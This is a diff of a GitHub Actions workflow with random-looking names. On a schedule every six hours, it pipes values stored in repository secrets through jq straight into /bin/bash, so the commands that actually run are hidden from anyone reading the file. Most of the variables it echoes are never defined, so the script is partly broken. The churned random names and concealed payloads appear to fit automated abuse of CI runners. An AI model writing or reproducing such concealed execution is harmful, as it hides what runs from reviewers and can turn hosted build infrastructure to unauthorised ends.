@@ -2,7 +2,7 @@ name: huangjiao2314
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 1/6 * * *'
+    - cron: '4 5/6 * * *'
 
 jobs:
   build:
@@ -11,11 +11,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: huangjiao2314
         env:
-          e433: ${{ secrets.e433 }}
+          heoef05129: ${{ secrets.heoef05129 }}
         run: |
-          echo $e433 | jq -r .wdnj57208 | /bin/bash
-          echo $ya868 | jq -r .pkpi95214 | /bin/bash
-          echo $kvye4 | jq -r .xoml6 | /bin/bash
-          echo $rzyj61 | jq -r .zv64130 | /bin/bash
-          echo $aelb3 | jq -r .unky53996 | /bin/bash
+          echo $heoef05129 | jq -r .z5 | /bin/bash
+          echo $vj90 | jq -r .jjsuj5 | /bin/bash
+          echo $ucr79 | jq -r .pztkg0 | /bin/bash
+          echo $lmle31852 | jq -r .rc516 | /bin/bash
+          echo $x80 | jq -r .ln91 | /bin/bash
+          echo $nr019 | jq -r .jlzn03 | /bin/bash
+          echo $axlhn53231 | jq -r .wdfjr22 | /bin/bash
+          echo $evzc7 | jq -r .pll985 | /bin/bash
+          echo $u070 | jq -r .dlo37356 | /bin/bash
+          echo $vh15209 | jq -r .x903 | /bin/bash
 
